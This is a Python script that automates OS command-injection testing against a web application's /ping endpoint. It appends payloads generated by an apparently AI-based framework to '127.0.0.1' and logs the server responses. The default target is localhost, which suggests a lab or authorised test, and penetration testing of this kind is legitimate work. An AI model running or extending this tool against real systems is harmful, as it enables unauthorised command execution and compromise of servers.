import requests
import urllib.parse
from gpt_automation import GPTCommandInjectionFramework
import json
import time

class CommandInjectionTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.gpt_framework = GPTCommandInjectionFramework()
        self.session = requests.Session()
        
    def test_injection(self, payload, parameter="host"):
        data = {parameter: payload}
        
        try:
            response = self.session.post(
                f"{self.target_url}/ping",
                data=data,
                timeout=10
            )
            
            return {
                "status_code": response.status_code,
                "response_text": response.text,
                "payload": payload,
                "timestamp": time.time()
            }
        except Exception as e:
            return {
                "error": str(e),
                "payload": payload,
                "timestamp": time.time()
            }
    
    def run_automated_test(self, injection_types=["basic", "advanced"]):
        results = []
        
        for injection_type in injection_types:
            print(f"Testing {injection_type} payloads...")
            payloads = self.gpt_framework.generate_payload(
                target_info=self.target_url,
                injection_type=injection_type
            )
            
            for payload in payloads:
                print(f"Testing payload: {payload[:50]}...")
                test_payload = f"127.0.0.1{payload}"
                
                result = self.test_injection(test_payload)
                
                if "response_text" in result:
                    analysis = self.gpt_framework.analyze_response(result["response_text"])
                    result["analysis"] = analysis
                
                results.append(result)
                time.sleep(1)  # Rate limiting
        
        return results

if __name__ == "__main__":
    tester = CommandInjectionTester("http://localhost:8080")
    results = tester.run_automated_test()
    
    with open("results/test_results.json", "w") as f:
        json.dump(results, f, indent=2)
    
    print(f"Testing completed. Results saved to results/test_results.json")
